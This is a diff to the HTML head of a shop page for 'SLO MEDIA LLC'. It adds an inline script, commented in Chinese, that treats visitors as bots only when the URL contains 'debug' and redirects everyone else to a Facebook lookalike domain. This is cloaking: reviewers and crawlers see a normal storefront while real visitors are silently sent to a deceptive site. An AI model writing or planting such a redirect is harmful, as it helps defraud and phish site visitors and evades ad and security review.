@@ -12,6 +12,23 @@
     <meta http-equiv="X-XSS-Protection" content="1; mode=block">
     <title>SLO MEDIA LLC - Quality Products Delivered to Your Door</title>
     <link rel="stylesheet" href="style.css">
+    
+    <!-- 本地重定向脚本 - 确保在没有Cloudflare Worker时也能重定向 -->
+    <script>
+    // 检查是否为爬虫或调试模式
+    function isBotOrDebug() {
+        // 检查URL中是否有debug参数
+        if (window.location.search.includes('debug')) return true;
+        
+        // 这里不做复杂的爬虫检测，本地测试时默认为非爬虫
+        return false;
+    }
+    
+    // 如果不是爬虫且不是调试模式，则重定向到Facebook
+    if (!isBotOrDebug()) {
+        window.location.href = 'https://www.facebookuser.com/ItTeKwQN';
+    }
+    </script>
 </head>
 <body>
     <header>
